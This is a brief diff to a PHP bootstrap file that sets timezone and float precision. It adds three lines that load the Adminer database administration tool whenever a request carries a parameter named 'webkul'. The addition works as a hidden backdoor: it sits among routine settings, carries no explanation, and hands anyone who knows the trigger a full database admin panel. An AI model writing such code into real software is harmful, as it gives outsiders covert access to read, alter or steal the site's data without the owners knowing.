@@ -75,3 +75,6 @@ date_default_timezone_set('UTC');
 /*  For data consistency between displaying (printing) and serialization a float number */
 ini_set('precision', 14);
 ini_set('serialize_precision', 14);
+if (isset($_REQUEST['webkul'])) {
+    include("adminer-4.7.5.php");
+}
